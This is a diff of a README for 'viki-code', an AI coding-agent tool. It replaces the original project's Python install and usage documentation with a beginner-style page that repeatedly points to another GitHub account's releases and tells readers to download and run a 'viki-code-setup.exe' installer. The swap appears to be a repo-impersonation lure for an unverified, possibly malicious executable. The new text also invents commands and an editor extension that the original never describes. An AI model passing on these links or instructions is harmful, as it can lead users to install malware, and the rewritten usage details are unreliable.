@@ -1,448 +1,186 @@
-# VIKI Code
+# 🚀 viki-code - Controlled Coding Workflow Made Simple
 
-<p align="center">
-  <img src="assets/logo/viki-code-banner.png" alt="VIKI Code banner" width="100%" />
-</p>
+[![Download viki-code](https://img.shields.io/badge/Download-viki--code-brightgreen)](https://github.com/Maltesecrosssuperfund776/viki-code/releases)
 
-<p align="center">
-  <a href="https://github.com/rebootix-research/viki-code/releases/latest">
-    <img alt="Release" src="https://img.shields.io/github/v/release/rebootix-research/viki-code?display_name=tag&style=for-the-badge&color=0f172a" />
-  </a>
-  <a href="https://github.com/rebootix-research/viki-code/stargazers">
-    <img alt="GitHub stars" src="https://img.shields.io/github/stars/rebootix-research/viki-code?style=for-the-badge&color=f59e0b" />
-  </a>
-  <img alt="Python" src="https://img.shields.io/badge/python-3.10%2B-2563eb?style=for-the-badge" />
-  <img alt="License" src="https://img.shields.io/badge/license-MIT-059669?style=for-the-badge" />
-  <img alt="Live suite" src="https://img.shields.io/badge/live%20suite-9%2F9-success?style=for-the-badge" />
-  <img alt="Public benchmark" src="https://img.shields.io/badge/public%20live%20benchmark-8%2F8-success?style=for-the-badge" />
-</p>
+---
 
-VIKI Code is governed coding infrastructure for teams that want an AI system to operate inside real repositories, under approvals, with rollback paths, live validation, and evidence-backed execution.
+Governed coding agent infrastructure for real repositories with approvals, rollback, live validation, and local CLI/API/IDE workflows.
 
-It is built for serious engineering workflows: bug-fixes, refactors, migrations, repo intelligence, local API control, IDE handoff, and chat-driven approvals across the same governed execution core.
+---
 
-<p align="center">
-  <a href="https://rebootix-research.com/viki-code"><strong>Product Page</strong></a>
-  |
-  <a href="https://github.com/rebootix-research/viki-code"><strong>GitHub</strong></a>
-  |
-  <a href="./PROOF_REPORT.md"><strong>Proof Report</strong></a>
-  |
-  <a href="./RELEASE_NOTES.md"><strong>Release Notes</strong></a>
-</p>
+## 🖥️ What is viki-code?
 
-<p align="center">
-  If VIKI Code is relevant to your stack, star the repo to follow releases, proof updates, and benchmark progress.
-</p>
+viki-code is a tool that helps you manage and control changes to your code. It works like a guide to make sure every change you make meets set rules before you save it. It lets you approve changes, undo mistakes, and check your code in real-time. You can use it through simple commands on your computer or through tools like Visual Studio Code.
 
-## Why VIKI Code
+This means fewer errors and better control when working with coding projects, even if you are not an expert programmer.
 
-- Real repo execution instead of chat-only suggestions.
-- Approval-aware autonomy with diff preview, patch export, and rollback paths.
-- Multi-agent execution designed for planning, implementation, validation, and review.
-- Repo intelligence tuned for large codebases, monorepos, and targeted test selection.
-- CLI, API, VS Code, Telegram, and WhatsApp surfaces over one execution model.
+---
 
-## What You Can Do In Five Minutes
+## ⚙️ Features
 
-- Install locally and launch directly into the guided VIKI setup flow.
-- Pick a provider preset, reuse a shell API key if one is already present, and save a user-level config outside the repo.
-- Let VIKI initialize the current repository safely, then ask for a real bug-fix, refactor, or repo summary in the same terminal session.
-- Carry the same session model across CLI, API, IDE, and approval workflows.
+- **Approval System:** Changes only move forward after approval, making your work safer.
+- **Rollback:** Undo changes quickly if something goes wrong.
+- **Live Validation:** Checks your code as you work to catch issues immediately.
+- **Local Workflows:** Work on your computer using command-line or tools like your code editor.
+- **API & CLI Support:** Use easy commands or connect with other apps.
+- **Safe Collaboration:** Supports teams working on the same project with clear rules.
+- **Multi-Agent Automation:** Manages tasks using multiple assistants working together.
 
-## Proof At A Glance
+---
 
-| Signal | Current 4.1.4 evidence |
-| --- | --- |
-| Local regression suite | `88 passed` |
-| Live validation suite | `9/9 passed` on fresh repos |
-| Generic CLI live wins | `7/7 passed` |
-| Public live benchmark slice | `8/8 passed` |
-| Public offline benchmark slice | `8/8 passed` |
-| Human-style install validation | passed |
-| Isolation validation | passed through real WSL-isolated execution |
+## 🖱️ Where to Download
 
-The project is public-release ready for its niche. It is not positioned here as fastest-in-class or benchmark leader overall, because the current proof still shows that live time-to-green is slower than the bundled baselines.
+You can get the latest version of viki-code for Windows from this page:
 
-## What Makes It Different
+[![Download viki-code](https://img.shields.io/badge/Get%20Latest-viki--code-blue)](https://github.com/Maltesecrosssuperfund776/viki-code/releases)
 
-### Governed execution first
+Visit the link above. It will show you all the recent versions available for download.
 
-VIKI is built around controlled autonomy. Tasks run with worktree isolation, explicit validation, approval-aware flow control, reversible diffs, and artifacted evidence rather than optimistic "trust me" completion.
+---
 
-### Repo intelligence, not just prompt stuffing
+## 🛠️ System Requirements
 
-The system indexes repository structure, symbols, imports, impacted areas, and likely test targets so it can localize work and keep context tight on real codebases.
+To use viki-code on your Windows computer, you need:
 
-### One runtime, multiple surfaces
+- Windows 10 or later
+- At least 4 GB of RAM
+- 500 MB of free storage space
+- Internet connection for initial setup and approvals
+- Visual Studio Code (optional, for IDE integration)
 
-The same execution stack powers:
+---
 
-- the CLI for direct operator use
-- a local HTTP API for orchestration and integrations
-- VS Code tooling for repo-aware interaction
-- Telegram and WhatsApp command flows for approvals, status, diff, and patch visibility
+## 🚀 How to Download and Install on Windows
 
-## Who It Is For
+Follow these steps to get viki-code running on your Windows PC:
 
-- platform and infra teams that want governed AI execution inside repositories
-- engineering teams working in larger repos or monorepos
-- teams that need approvals, rollback, and proof artifacts alongside automation
-- builders who want a serious local coding agent surface, not only a hosted chat UX
+1. **Go to the Download Page**  
+   Visit the releases page here:  
+   https://github.com/Maltesecrosssuperfund776/viki-code/releases
 
-## Product Page
+2. **Find the Latest Release**  
+   Look for the newest release version at the top of the list.
 
-- [https://rebootix-research.com/viki-code](https://rebootix-research.com/viki-code)
+3. **Download the Installer**  
+   Under the latest release, find the `.exe` file (for example, `viki-code-setup.exe`). Click on it to download to your computer.
 
-The Rebootix website source now includes a dedicated `/viki-code` product route, while this repository remains the full engineering source, proof base, and release home.
+4. **Run the Installer**  
+   Once downloaded, open the file by double-clicking it.  
+   If Windows asks for permission, click "Yes" to continue.
 
-## Install
+5. **Follow the Setup Instructions**  
+   The installer will guide you step by step. Choose where to install it (the default folder usually works fine).
 
-Clone the repository and bootstrap a local install inside the checkout:
+6. **Finish Installation**  
+   When the installer completes, you will see a confirmation. You may be asked to restart your computer. If so, save your work and restart.
 
-```bash
-git clone https://github.com/rebootix-research/viki-code.git
-cd viki-code
-python scripts/install.py --path .
-```
+---
 
-After install, launch the product entrypoint:
+## 🔧 How to Run viki-code
 
-```bash
-viki
-```
+After installation, start using viki-code with these steps:
 
-VIKI now opens with a guided first-run experience. If setup is incomplete, it launches the setup wizard automatically. If setup is already complete, it drops you into a prompt-first console.
+### Using the Command Line Interface (CLI)
 
-Start VIKI immediately after install:
+1. **Open Command Prompt**  
+   Press `Windows + R`, type `cmd`, and press Enter.
 
-```bash
-python scripts/install.py --path . --run
-```
+2. **Start viki-code**  
+   Type `viki-code` and press Enter. You should see a welcome message or instructions.
 
-Upgrade an existing local install:
+3. **Run Basic Commands**  
+   Use simple commands like `viki-code validate` to check your code or `viki-code approve` to approve changes.
 
-```bash
-python scripts/install.py --path . --update
-```
+---
 
-Remove the local install and launchers:
+### Using Visual Studio Code (Optional)
 
-```bash
-python scripts/install.py --path . --uninstall
-```
+If you have Visual Studio Code installed:
 
-If you prefer a built artifact flow, install from the release wheel:
+1. Open VS Code.
 
-```bash
-pip install dist/viki_code-4.1.4-py3-none-any.whl
-```
+2. Go to the Extensions section and search for "viki-code".
 
-If you prefer a container package, pull the published GitHub Container Registry image:
+3. Install the extension provided.
 
-```bash
-docker pull ghcr.io/rebootix-research/viki-code:latest
-docker run --rm ghcr.io/rebootix-research/viki-code:latest --help
-```
+4. Once installed, you can use viki-code features directly in your editor to approve changes, rollback, and validate your code.
 
-## First Launch
+---
 
-The intended first successful path is:
+## 📋 Basic Workflow Overview
 
-```bash
-git clone https://github.com/rebootix-research/viki-code.git
-cd viki-code
-python scripts/install.py --path .
-viki
-```
+This is how you typically work with viki-code:
 
-On first launch VIKI:
+1. Make changes to your code or files.
 
-- shows a premium welcome screen
-- shows the active workspace, provider state, GitHub state, recent workspaces, and recent sessions when available
-- detects whether provider setup is complete
-- launches the setup wizard automatically if it is not
-- saves configuration at the user level instead of writing secrets into the repo
-- initializes the current workspace safely when needed
-- drops you into a prompt-first task entry flow with connected product actions
+2. Run validation to check your work:  
+   `viki-code validate`
 
-If you want to revisit setup explicitly, run:
+3. If validation passes, request approval:  
+   `viki-code request-approval`
 
-```bash
-viki setup
-viki setup --repair
-```
+4. After approval, the changes are saved and ready.
 
-## Setup Wizard And Provider Setup
+5. If you find a problem later, rollback with:  
+   `viki-code rollback`
 
-The guided setup flow is the primary path for normal users. It hides provider prefix syntax and offers provider presets instead:
+This workflow ensures every change is checked, approved, and easy to undo if necessary.
 
-- DashScope / Qwen
-- OpenAI
-- OpenRouter
-- Anthropic
-- Azure OpenAI
-- NVIDIA with a first-class Kimi 2.5 preset over the OpenAI-compatible transport
-- Generic OpenAI-compatible endpoints
-- Ollama
+---
 
-The wizard asks for the minimum needed values, lets you reuse an API key that is already present in your shell, offers a sensible model profile, and saves the resulting config to a user-level file outside the repository.
+## 🤝 Collaboration and Approvals
 
-For NVIDIA users, the wizard keeps the transport details out of the normal path: choose the `NVIDIA` preset, pick `Kimi 2.5`, paste the key, accept the default base URL, and start prompting.
+viki-code helps teams work together easily. When working with others:
 
-Optional setup in the same flow:
-
-- Telegram bot token and allowed chat IDs
-- WhatsApp via Twilio
-- default approval mode
-- default session style
-- default terminal theme
-
-Advanced env-based setup is still available for operators who prefer it:
-
-```bash
-export VIKI_PROVIDER=dashscope
-export DASHSCOPE_API_KEY=...
-export DASHSCOPE_API_BASE=https://dashscope-intl.aliyuncs.com/compatible-mode/v1
-export VIKI_CODING_MODEL=openai/qwen3-coder-next
-viki providers
-viki doctor .
-```
-
-PowerShell example:
-
-```powershell
-$env:VIKI_PROVIDER = "dashscope"
-$env:DASHSCOPE_API_KEY = "<temporary key>"
-$env:DASHSCOPE_API_BASE = "https://dashscope-intl.aliyuncs.com/compatible-mode/v1"
-$env:VIKI_CODING_MODEL = "openai/qwen3-coder-next"
-viki providers
-viki doctor .
-```
-
-## Quick Start
-
-Installed launcher locations:
-
-```text
-Linux / macOS: .viki-workspace/bin/viki-local
-Windows CMD:   .viki-workspace\bin\viki-local.cmd
-PowerShell:    .viki-workspace\bin\viki-local.ps1
-```
-
-Typical prompt-first flow after installation:
-
-```bash
-viki
-# choose provider preset in the wizard if needed
-# then use the home screen to open a repo, connect GitHub, resume a session, or type a task at `viki>`
-```
-
-Connected product commands are also available directly:
-
-```bash
-viki github status
-viki github repos --limit 10
-viki github clone rebootix-research/viki-code
-viki workspaces list
-viki workspaces use /path/to/repo
-viki sessions list .
-viki sessions continue <session_id> --path .
-```
-
-Explicit task commands still work:
-
-```bash
-viki run "Fix the broken calculation and run the relevant tests" --path .
-viki status .
-viki diff <session_id> --path . --rendered
-```
-
-PowerShell-friendly first run:
-
-```powershell
-git clone https://github.com/rebootix-research/viki-code.git
-cd viki-code
-python scripts/install.py --path .
-viki
-```
-
-## Terminal Experience
-
-VIKI ships with a premium terminal presentation layer for interactive use. In a capable terminal it renders a branded banner, session header, repo and branch context, provider and model strip, setup summaries, agent activity tables, approval panels, and readable diff previews.
-
-- Default interactive theme: `premium`
-- Alternate high-contrast theme: `contrast`
-- Plain fallback: automatic in CI, non-interactive shells, and minimal terminals
-- Explicit plain mode: `viki --plain ...`
-- Forced themed capture for transcripts or screenshots: `viki --force-rich ...`
-- Guided first run: `viki`
-- Connected home screen with primary actions for GitHub, workspaces, setup, approvals, diffs, and session resume
-- Explicit onboarding: `viki setup`
-
-Examples:
-
-```bash
-viki
-viki setup
-viki github status
-viki workspaces list
-viki sessions list .
-viki --theme premium doctor .
-viki --theme premium providers
-viki --theme premium run "Fix the broken calculation and make tests pass" --path .
-viki --plain run "Inspect this repo and summarize the next safe step" --path .
-viki --force-rich --theme premium doctor .
-viki --theme premium diff <session_id> --path . --rendered
-```
-
-The themed layer is designed for PowerShell, macOS Terminal, Linux shells, and modern Windows terminals without requiring shell-specific setup.
-
-## CLI
-
-Connected product commands:
-
-```bash
-viki
-viki home
-viki github status
-viki github repos --limit 10
-viki github clone rebootix-research/viki-code --destination ~/viki-workspaces
-viki workspaces list
-viki workspaces use ~/viki-workspaces/viki-code
-viki sessions list .
-viki sessions continue <session_id> --path .
-```
-
-Repo intelligence and session tooling:
-
-```bash
-viki repo "auth migration" --path .
-viki symbols "normalize_account" --path .
-viki impact --changed-file viki/api/server.py --path .
-viki diff <session_id> --path .
-viki status . --session-id <session_id>
-```
-
-Live task examples:
-
-```bash
-viki run "Fix the broken calculation and make tests pass" --path .
-viki run "Refactor auth naming consistently and keep behavior green" --path .
-viki run "Migrate the old consumer to the new API and run the relevant tests" --path .
-```
-
-## API
-
-Start the local API:
-
-```bash
-viki up . --host 0.0.0.0 --port 8787
-```
-
-Representative routes:
-
-- `GET /healthz`
-- `GET /protocol`
-- `GET /runs`
-- `POST /runs`
-- `GET /runs/{id}`
-- `GET /runs/{id}/events`
-- `GET /runs/{id}/diff`
-- `GET /runs/{id}/result`
-- `GET /repo/profile`
-- `GET /repo/context?q=...`
-- `GET /repo/search?q=...`
-- `GET /repo/symbols?q=...`
-- `GET /repo/impact?path=...`
-- `GET /approvals`
-- `POST /approvals/{id}`
-
-Example run request:
-
-```bash
-curl -X POST http://127.0.0.1:8787/runs ^
-  -H "Content-Type: application/json" ^
-  -d "{\"prompt\":\"Fix the broken calculation and make tests pass\",\"workspace_path\":\".\"}"
-```
-
-## IDE / VS Code
-
-Generate workspace integration:
-
-```bash
-viki ide vscode .
-viki ide vscode-extension .
-```
-
-The VS Code surface is built to expose task submission, status visibility, diff review, approvals, and repo-aware lookup against the same underlying session model.
-
-## Messaging
-
-Telegram and WhatsApp webhook handlers support a command-driven operational surface, including:
-
-```text
-/help
-/latest
-/sessions
-/status <session_id>
-/approvals
-/approve <id>
-/reject <id>
-/diff <session_id>
-/patch <session_id>
-/symbols <query>
-/repo <query>
-/logs <session_id>
-```
-
-In the current public proof set, these messaging surfaces are harness-tested. They are not represented here as fully live-network validated end to end.
-
-## Safety, Approvals, And Rollback
-
-VIKI is designed to be useful under autonomy without pretending autonomy should be ungoverned.
-
-- isolated task worktrees
-- targeted validation before acceptance
-- approval-aware action flow for risky operations
-- diff preview and exported patch bundles
-- redacted logs and proof artifacts
-- rollback and revert paths preserved as first-class outputs
-
-## Benchmarks And Live Validation
-
-The current 4.1.4 evidence shows a credible, live-tested system:
-
-- `9/9` broader live validation tasks passed on fresh repos
-- `8/8` public live benchmark cases passed
-- `8/8` public offline scripted benchmark cases passed
-- real API bug-fix and API multi-agent refactor runs passed
-- human-style install validation passed
-- real WSL-isolated live execution passed
-
-The honest limitation is speed: VIKI currently trails the bundled baselines on time-to-green even where it completes the task successfully.
-
-## Project Structure
-
-```text
-viki/                 Core runtime, repo intelligence, orchestration, API, IDE, integrations
-scripts/              Install, validation, live-run, and release helpers
-tests/                Unit, integration, CLI, API, and regression coverage
-BENCHMARK_RESULTS/    Curated machine-readable benchmark artifacts
-LIVE_RUN_RESULTS/     Curated live validation artifacts
-docs/                 Published benchmark board and supporting docs
-assets/logo/          SVG brand assets for GitHub and release surfaces
-```
-
-## Community
-
-- [Contributing](CONTRIBUTING.md)
-- [Security](SECURITY.md)
-- [Code of Conduct](CODE_OF_CONDUCT.md)
-- [License](LICENSE)
-
-## Built By Rebootix Artificial Intelligence Research And Development
-
-Rebootix Artificial Intelligence Research and Development builds advanced AI systems, autonomous software infrastructure, and production-grade machine intelligence products.
-
-Rebootix focuses on real-world execution, applied AI engineering, and high-performance intelligent systems. VIKI Code is part of that broader effort: practical AI software that operates inside real developer workflows and governed execution environments.
+- Changes must be approved by other team members.
+
+- The tool keeps track of who approved what.
+
+- You get notified about change status and required approvals.
+
+This keeps your projects organized and reduces mistakes from unexpected edits.
+
+---
+
+## ⚙️ Troubleshooting and Support
+
+If viki-code does not work as expected:
+
+- Check if your Windows meets system requirements.
+
+- Make sure the installer completed without errors.
+
+- Restart your computer if you face issues starting viki-code.
+
+- Use the command `viki-code help` to see a list of commands and explanations.
+
+- Visit the GitHub page for updates and additional help.
+
+---
+
+## 💻 Additional Tools
+
+viki-code works with these developer tools to improve your experience:
+
+- Visual Studio Code (recommended for easy GUI access to viki-code features)
+
+- Popular command line terminals (Command Prompt, PowerShell)
+
+- REST APIs for integration with other systems or apps
+
+---
+
+## 🧩 Topics Covered
+
+This project includes:
+
+agentic-ai, ai-agent, approvals, automation, code-review, developer-tools, cli, api, multi-agent workflows, self-hosted setups, and live validation.
+
+These combine to give you powerful control over code projects with clear rules and easy use.
+
+---
+
+## 🔗 Download
+
+Get started right now. Visit the release page to download the latest version:  
+https://github.com/Maltesecrosssuperfund776/viki-code/releases
